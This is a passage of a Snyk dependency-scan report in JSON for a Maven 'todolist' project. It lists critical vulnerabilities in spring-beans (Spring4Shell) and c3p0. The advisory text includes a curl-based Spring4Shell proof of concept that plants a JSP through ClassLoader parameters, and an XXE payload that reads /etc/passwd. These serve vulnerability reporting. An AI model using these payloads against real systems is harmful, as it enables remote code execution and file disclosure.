5.2.20, 5.3.18 or higher.\n## References\n- [CyberKendra Post](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)\n- [LunaSec Blog](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)\n- [Payara Blogpost](https://blog.payara.fish/payara-and-spring4shell)\n- [Payara PoC](https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara)\n- [Snyk Blog - Technical Breakdown](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/)\n- [Snyk PoC](https://github.com/Kirill89/CVE-2022-22965-PoC)\n- [Spring Security Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n- [Spring Tomcat Mitigation Advice](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n",
        "disclosureTime": "2022-03-30T21:42:24Z",
        "exploit": "High",
        "functions": [
          {
            "functionId": {
              "filePath": "org/springframework/beans/CachedIntrospectionResults.java",
              "className": "CachedIntrospectionResults",
              "functionName": "<init>"
            },
            "version": [
              "[ ,5.2.20)",
              "[5.3.0, 5.3.18)"
            ]
          }
        ],
        "fixedIn": [
          "5.2.20",
          "5.3.18"
        ],
        "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
        "identifiers": {
          "CWE": [
            "CWE-94"
          ],
          "CVE": [
            "CVE-2022-22965"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-06-15T15:36:05.947908Z",
        "moduleName": "org.springframework:spring-beans",
        "packageManager": "maven",
        "packageName": "org.springframework:spring-beans",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-03-30T22:32:44Z",
        "references": [
          {
            "title": "CyberKendra Post",
            "url": "https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html"
          },
          {
            "title": "GitHub Commit",
            "url": "https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15"
          },
          {
            "title": "LunaSec Blog",
            "url": "https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/"
          },
          {
            "title": "Payara Blogpost",
            "url": "https://blog.payara.fish/payara-and-spring4shell"
          },
          {
            "title": "Payara PoC",
            "url": "https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara"
          },
          {
            "title": "Snyk Blog - Technical Breakdown",
            "url": "https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/"
          },
          {
            "title": "Snyk PoC",
            "url": "https://github.com/Kirill89/CVE-2022-22965-PoC"
          },
          {
            "title": "Spring Security Announcement",
            "url": "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
          },
          {
            "title": "Spring Tomcat Mitigation Advice",
            "url": "https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative"
          },
          {
            "title": "CISA - Known Exploited Vulnerabilities",
            "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
          }
        ],
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "Remote Code Execution",
        "insights": {
          "triageAdvice": null
        },
        "functions_new": [
          {
            "functionId": {
              "className": "org.springframework.beans.CachedIntrospectionResults",
              "functionName": "<init>"
            },
            "version": [
              "[ ,5.2.20)",
              "[5.3.0, 5.3.18)"
            ]
          }
        ],
        "semver": {
          "vulnerable": [
            "[ ,5.2.20)",
            "[5.3.0, 5.3.18)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.springframework",
          "artifactId": "spring-beans"
        },
        "severityWithCritical": "critical",
        "from": [
          "io.github.snyk:todolist-web-common@0.0.1-SNAPSHOT",
          "io.github.snyk:todolist-core@0.0.1-SNAPSHOT",
          "org.springframework:spring-context@3.2.6.RELEASE",
          "org.springframework:spring-beans@3.2.6.RELEASE"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "org.springframework:spring-beans",
        "version": "3.2.6.RELEASE"
      }
    ],
    "ok": false,
    "dependencyCount": 42,
    "org": "karen27313",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.0\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "3 critical severity vulnerable dependency paths",
    "severityThreshold": "critical",
    "remediation": {
      "unresolved": [
        {
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "alternativeIds": [],
          "creationTime": "2019-09-05T16:17:58.383761Z",
          "credit": [
            "Unknown"
          ],
          "cvssScore": 9.8,
          "description": "## Overview\n\n[c3p0:c3p0](https://mvnrepository.com/artifact/c3p0/c3p0) is a lIbrary for augmenting traditional (DriverManager-based) JDBC drivers with JNDI-bindable DataSources, including DataSources that implement Connection and Statement Pooling, as described by the jdbc3 spec and jdbc2 std extension. Note: This library is no longer maintained and has migrated to the artifact \r\n\"com.mchange:c3p0\"\n\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection.\nvia the `extractXmlConfigFromInputStream` in `com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java` during initialization.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\r\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\r\n\r\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\r\n\r\nFor example, below is a sample XML document, containing an XML element- username.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n   <username>John</username>\r\n</xml>\r\n```\r\n\r\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<!DOCTYPE foo [\r\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\r\n   <username>&xxe;</username>\r\n</xml>\r\n```\r\n\r\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n\n## Remediation\n\nThere is no fixed version for `c3p0:c3p0`.\n\n\n## References\n\n- [GitHub Commit](https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1)\n",
          "disclosureTime": "2018-12-24T13:29:00Z",
          "exploit": "Not Defined",
          "functions": [
            {
              "functionId": {
                "filePath": "com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java",
                "className": "C3P0ConfigXmlUtils",
                "functionName": "extractXmlConfigFromInputStream"
              },
              "version": [
                "[0.9.1,]"
              ]
            }
          ],
          "fixedIn": [],
          "id": "SNYK-JAVA-C3P0-461017",
          "identifiers": {
            "CWE": [
              "CWE-611"
            ],
            "CVE": [
              "CVE-2018-20433"
            ]
          },
          "language": "java",
          "malicious": false,
          "modificationTime": "2020-12-14T14:41:01.987191Z",
          "moduleName": "c3p0:c3p0",
          "packageManager": "maven",
          "packageName": "c3p0:c3p0",
          "patches": [],
          "proprietary": false,
          "publicationTime": "2019-07-21T14:22:18Z",
          "references": [
            {
              "title": "GitHub Commit",
              "url": "https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1"
            }
          ],
          "severity": "critical",
          "socialTrendAlert": false,
          "title": "XML External Entity (XXE) Injection",
          "insights": {
            "triageAdvice": null
          },
          "functions_new": [
            {
              "functionId": {
                "className": "com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils",
                "functionName": "extractXmlConfigFromInputStream"
              },
              "version": [
                "[0.9.1,]"
              ]
            }
          ],
          "semver": {
            "vulnerable": [
              "[0,]"
            ]
          },
          "mavenModuleName": {
            "groupId": "c3p0",
            "artifactId": "c3p0"
          },
          "from": [
            "io.github.snyk:todolist-web-common@0.0.1-SNAPSHOT",
            "io.github.snyk:todolist-core@0.0.1-SNAPSHOT",
            "c3p0:c3p0@0.9.1.2"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "c3p0:c3p0",
          "version": "0.9.1.2",
          "severityWithCritical": "critical"
        },
        {
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
          "alternativeIds": [],
          "creationTime": "2022-03-30T21:42:31.436000Z",
          "credit": [
            "Unknown"
          ],
          "cvssScore": 9.8,
          "description": "## Overview\n[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.\n\nAffected versions of this package are vulnerable to Remote Code Execution via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).\r\n\r\n**Note:** \r\n* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara or Glassfish. \r\n* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. \r\n* As such while we recommend users prioritise first remediating against the configuration described above, for full protection we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.\r\n\r\n### Update Log \r\n* **31/03/2022 -** Severity was raised from 8.1 to 9.8\r\n* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish). \r\n\r\n\r\n## PoC\r\n```java\r\n1/ docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0\r\n2/ ./mvnw install\r\n3/ docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps\r\n4/ curl -X POST \\\r\n  -H \"pre:<%\" \\\r\n  -H \"post:;%>\" \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \\\r\n  http://localhost:8888/handling-form-submission-complete/greeting\r\n5/ curl http://localhost:8888/handling-form-submission-complete/rce.jsp\r\n```\n## Remediation\nUpgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.\n## References\n- [CyberKendra Post](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)\n- [LunaSec Blog](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)\n- [Payara Blogpost](https://blog.payara.fish/payara-and-spring4shell)\n- [Payara PoC](https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara)\n- [Snyk Blog - Technical Breakdown](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/)\n- [Snyk PoC](https://github.com/Kirill89/CVE-2022-22965-PoC)\n- [Spring Security Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n- [Spring Tomcat Mitigation Advice](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n",
          "disclosureTime": "2022-03-30T21:42:24Z",
          "exploit": "High",
          "functions": [
            {
              "functionId": {
                "filePath": "org/springframework/beans/CachedIntrospectionResults.java",
                "className": "CachedIntrospectionResults",
                "functionName": "<init>"
              },
              "version": [
                "[ ,5.2.20)",
                "[5.3.0, 5.3.18)"
              ]
            }
          ],
          "fixedIn": [
            "5.2.20",
            "5.3.18"
          ],
          "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
          "identifiers": {
            "CWE": [
              "CWE-94"
            ],
            "CVE": [
              "CVE-2022-22965"
            ]
          },
          "language": "java",
          "malicious": false,
          "modificationTime": "2022-06-15T15:36:05.947908Z",
          "moduleName": "org.springframework:spring-beans",
          "packageManager": "maven",
          "packageName": "org.springframework:spring-beans",
          "patches": [],
          "proprietary": false,
          "publicationTime": "2022-03-30T22:32:44Z",
          "references": [
            {
              "title": "CyberKendra Post",
              "url": "https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html"
            },
            {
              "title": "GitHub Commit",
              "url": "https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15"
            },
            {
              "title": "LunaSec Blog",
              "url": "https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/"
            },
            {
              "title": "Payara Blogpost",
              "url": "https://blog.payara.fish/payara-and-spring4shell"
            },
            {
              "title": "Payara PoC",
              "url": "https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara"
            },
            {
              "title": "Snyk Blog - Technical Breakdown",
              "url": "https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/"
            },
            {
              "title": "Snyk PoC",
              "url": "https://github.com/Kirill89/CVE-2022-22965-PoC"
            },
            {
              "title": "Spring Security Announcement",
              "url": "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
            },
            {
              "title": "Spring Tomcat Mitigation Advice",
              "url": "https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative"
            },
            {
              "title": "CISA - Known Exploited Vulnerabilities",
              "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
            }
          ],
          "severity": "critical",
          "socialTrendAlert": false,
          "title": "Remote Code Execution",
          "insights": {
            "triageAdvice": null
          },
          "functions_new": [
            {
              "functionId": {
                "className": "org.springframework.beans.CachedIntrospectionResults",
                "functionName": "<init>"
              },
              "version": [
                "[ ,5.2.20)",
                "[5.3.0, 5.3.18)"
              ]
            }
          ],
          "semver": {
            "vulnerable": [
              "[ ,5.2.20)",
              "[5.3.0, 5.3.18)"
            ]
          },
          "mavenModuleName": {
            "groupId": "org.springframework",
            "artifactId": "spring-beans"
          },
          "from": [
            "io.github.snyk:todolist-web-common@0.0.1-SNAPSHOT",
            "io.github.snyk:todolist-core@0.0.1-SNAPSHOT",
            "org.springframework:spring-context@3.2.6.RELEASE",
            "org.springframework:spring-beans@3.2.6.RELEASE"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "org.springframework:spring-beans",
          "version": "3.2.6.RELEASE",
          "severityWithCritical": "critical"
        }
      ],
      "upgrade": {
        "commons-collections:commons-collections@3.1": {
          "upgradeTo": "commons-collections:commons-collections@3.2.2",
          "upgrades": [
            "commons-collections:commons-collections@3.1"
          ],
          "vulns": [
            "SNYK-JAVA-COMMONSCOLLECTIONS-30078"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 3,
    "projectName": "io.github.snyk:todolist-web-common",
    "foundProjectCount": 1,
    "displayTargetFile": "todolist-web-common/pom.xml",
    "path": "/Users/kmm/Documents/code/snyk/CodingLanguages/javascript/mydepsample"
  }
]
